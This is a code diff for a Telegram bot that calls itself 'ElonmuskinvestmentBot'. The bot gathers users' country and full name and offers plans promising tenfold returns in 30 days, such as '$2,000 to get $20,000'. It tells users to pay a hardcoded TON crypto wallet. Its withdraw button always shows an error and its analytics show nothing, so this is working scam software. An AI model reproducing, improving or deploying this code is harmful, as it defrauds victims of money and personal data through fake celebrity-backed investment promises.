@@ -3,16 +3,14 @@ from telebot import types
 import pycountry
 import json
 import os
-import flag  # Make sure to run: pip install emoji-country-flag
+import flag  # pip install emoji-country-flag
 from datetime import datetime
 from dotenv import load_dotenv
 
 # --- CONFIGURATION ---
 load_dotenv() 
 API_TOKEN = os.getenv('API_TOKEN')
-
-# IMPORTANT: Get your ID from @userinfobot and put it here
-ADMIN_ID = 6638267321
+ADMIN_ID = 6638267321 
 
 MY_TON_COIN = '0x58Ed91E903BbD23782A166f2434F85114A5e9594'
 CHANGELY = 'https://changelly.com/'
@@ -47,22 +45,19 @@ def get_user(uid):
     return db["users"][uid]
 
 def is_valid_country(text):
-    user_input = text.strip()
-    # Check if it's a flag emoji first
+    user_input = text.strip().upper()
     try:
-        code = flag.dflagize(user_input).replace(":", "")
-        if len(code) == 2: return True
+        code = flag.dflagize(text).replace(":", "")
+        if len(code) == 2 and pycountry.countries.get(alpha_2=code.upper()): return True
     except: pass
-
-    # Check by name or code
-    user_input_lower = user_input.lower()
+    if len(user_input) == 2 and pycountry.countries.get(alpha_2=user_input): return True
+    user_input_lower = text.strip().lower()
     for c in pycountry.countries:
         if user_input_lower == c.name.lower(): return True
         if hasattr(c, 'common_name') and user_input_lower == c.common_name.lower(): return True
-        if user_input_lower == c.alpha_2.lower(): return True
     return False
 
-# --- MAIN MENU ---
+# --- UI COMPONENTS ---
 def show_menu(chat_id, name, edit=False, message_id=None):
     markup = types.InlineKeyboardMarkup(row_width=2)
     markup.add(
@@ -71,7 +66,7 @@ def show_menu(chat_id, name, edit=False, message_id=None):
         types.InlineKeyboardButton("📉 Analytics", callback_data="main_anal"),
         types.InlineKeyboardButton("❔ Help", callback_data="main_help")
     )
-    text = f"Welcome to **ElonmuskinvestmentBot**, {name}! 🚀"
+    text = f"Welcome back, **{name}**! 🚀\nManage your investments below."
     if edit and message_id:
         bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
     else:
@@ -87,19 +82,7 @@ def start(m):
     else:
         u["step"] = "awaiting_country"
         save_data(db)
-        bot.send_message(m.chat.id, "Welcome! 👋\nPlease send your **Country Name** or **Flag** to verify.")
-
-@bot.message_handler(commands=['admin'])
-def admin_panel(m):
-    if m.from_user.id != ADMIN_ID:
-        bot.reply_to(m, "❌ Access Denied.")
-        return
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    markup.add(
-        types.InlineKeyboardButton("Check Reports", callback_data="adm_reports"),
-        types.InlineKeyboardButton("Control User", callback_data="adm_control")
-    )
-    bot.send_message(m.chat.id, "🛠 **Admin Panel**", reply_markup=markup)
+        bot.send_message(m.chat.id, "Welcome! 👋\nPlease send your **Country Name**, **Short Code**, or **Flag** to verify.")
 
 # --- TEXT HANDLER ---
 @bot.message_handler(func=lambda m: True)
@@ -110,31 +93,23 @@ def handle_text(m):
 
     if u["step"] == "awaiting_country":
         if is_valid_country(m.text):
-            # Resolve flag to name if needed
-            try:
-                code = flag.dflagize(m.text).replace(":", "")
-                if len(code) == 2:
-                    c_obj = pycountry.countries.get(alpha_2=code.upper())
-                    u["country_name"] = c_obj.name
-                else:
-                    u["country_name"] = m.text
-            except:
-                u["country_name"] = m.text
-            
-            u["step"] = "awaiting_name"
-            bot.reply_to(m, f"✅ {u['country_name']} verified! Now enter your **Full Name** (2+ words):")
-        else:
-            bot.reply_to(m, "❌ Invalid country or flag. Try again.")
+            u["country_name"], u["step"] = m.text, "awaiting_name"
+            bot.reply_to(m, "✅ Verified! Now enter your **Full Name**:")
+        else: bot.reply_to(m, "❌ Invalid country/flag.")
     
     elif u["step"] == "awaiting_name":
         if len(m.text.split()) >= 2:
-            u["name"] = m.text
-            u["step"] = "completed"
+            u["name"], u["step"] = m.text, "completed"
             show_menu(m.chat.id, m.text)
-        else:
-            bot.reply_to(m, "⚠️ Please enter a full name (minimum 2 words).")
-    
-    # ... (Keep other step handlers like reports/pin here)
+        else: bot.reply_to(m, "⚠️ Enter at least 2 words.")
+
+    elif u["step"] == "filing_report":
+        db["reports"].append({"id": uid, "msg": m.text, "date": str(datetime.now())})
+        u["step"] = "completed"
+        bot.send_message(m.chat.id, "✅ Your report has been sent to the admin.")
+        bot.send_message(ADMIN_ID, f"🔔 **New Report from {u['name']} ({uid})**:\n{m.text}")
+        show_menu(m.chat.id, u["name"])
+
     save_data(db)
 
 # --- CALLBACK HANDLER ---
@@ -146,24 +121,66 @@ def handle_callbacks(c):
     if c.data == "back_main":
         show_menu(c.message.chat.id, u["name"], edit=True, message_id=c.message.message_id)
 
-    elif c.data == "main_dash":
-        markup = types.InlineKeyboardMarkup(row_width=1)
-        markup.add(
-            types.InlineKeyboardButton("$2,000 to get $20,000", callback_data="inv_2000"),
+    elif c.data == "main_wallet":
+        markup = types.InlineKeyboardMarkup(row_width=2).add(
+            types.InlineKeyboardButton("Withdraw", callback_data="with_check"),
             types.InlineKeyboardButton("⬅️ Back", callback_data="back_main")
         )
-        bot.edit_message_text("📈 **Investment Plans**", c.message.chat.id, c.message.message_id, reply_markup=markup)
+        bot.edit_message_text(f"💳 **Wallet**\n\nBalance: `${u['balance']:,.2f}`", c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+    elif c.data == "main_dash":
+        markup = types.InlineKeyboardMarkup(row_width=1).add(
+            types.InlineKeyboardButton("$2,000 to get $20,000", callback_data="inv_2000"),
+            types.InlineKeyboardButton("$5,000 to get $50,000", callback_data="inv_5000"),
+            types.InlineKeyboardButton("$6,000 to get $60,000", callback_data="inv_6000"),
+            types.InlineKeyboardButton("$8,000 to get $80,000", callback_data="inv_8000"),
+            types.InlineKeyboardButton("$10,000 to get $100,000", callback_data="inv_10000"),
+            types.InlineKeyboardButton("⬅️ Back", callback_data="back_main")
+        )
+        bot.edit_message_text("📈 **Select Investment Plan**", c.message.chat.id, c.message.message_id, reply_markup=markup)
+
+    elif c.data == "main_anal":
+        if not u["investments"]:
+            markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("Invest Now", callback_data="main_dash"))
+            bot.edit_message_text("📉 **Analytics**\n\nYou have no active investments. Please invest first to see your growth analytics.", c.message.chat.id, c.message.message_id, reply_markup=markup)
+        else:
+            bot.answer_callback_query(c.id, "Calculating growth...", show_alert=False)
+
+    elif c.data == "main_help":
+        markup = types.InlineKeyboardMarkup(row_width=2).add(
+            types.InlineKeyboardButton("📩 Report", callback_data="h_report"),
+            types.InlineKeyboardButton("📖 Manual", callback_data="h_manual"),
+            types.InlineKeyboardButton("⬅️ Back", callback_data="back_main")
+        )
+        bot.edit_message_text("How can we help you today?", c.message.chat.id, c.message.message_id, reply_markup=markup)
+
+    elif c.data == "h_manual":
+        manual_text = ("📖 **User Manual**\n\n"
+                       "1. Select a plan from the Dashboard.\n"
+                       "2. Fund the provided TON Coin address.\n"
+                       "3. Your investment matures 10x in 30 days.\n"
+                       "4. Track progress in Analytics.")
+        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Back", callback_data="main_help"))
+        bot.edit_message_text(manual_text, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+    elif c.data == "h_report":
+        u["step"] = "filing_report"
+        save_data(db)
+        bot.edit_message_text("Please type your report/complaint below:", c.message.chat.id, c.message.message_id)
 
     elif c.data.startswith("inv_"):
         amt = c.data.split("_")[1]
-        msg = (f"📥 **Plan Selected: ${amt}**\n\n"
-               f"To begin, fund the **TON Coin** address below.\n\n"
-               f"TON Address:\n`{MY_TON_COIN}`\n\n"
-               f"Exchange Link:\n{CHANGELY}")
+        returns = int(amt) * 10
+        msg = (f"📥 **Plan: ${amt} to get ${returns:,}**\n\n"
+               f"Fund the **TON Coin** address below:\n`{MY_TON_COIN}`\n\n"
+               f"Exchange: {CHANGELY}")
         markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Back", callback_data="main_dash"))
         bot.edit_message_text(msg, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")
 
+    elif c.data == "with_check":
+        bot.answer_callback_query(c.id, "❌ Error: Minimum withdrawal requires active matured investment.", show_alert=True)
+
     save_data(db)
 
-print("Bot is running...")
+print("ElonmuskinvestmentBot Online...")
 bot.infinity_polling()
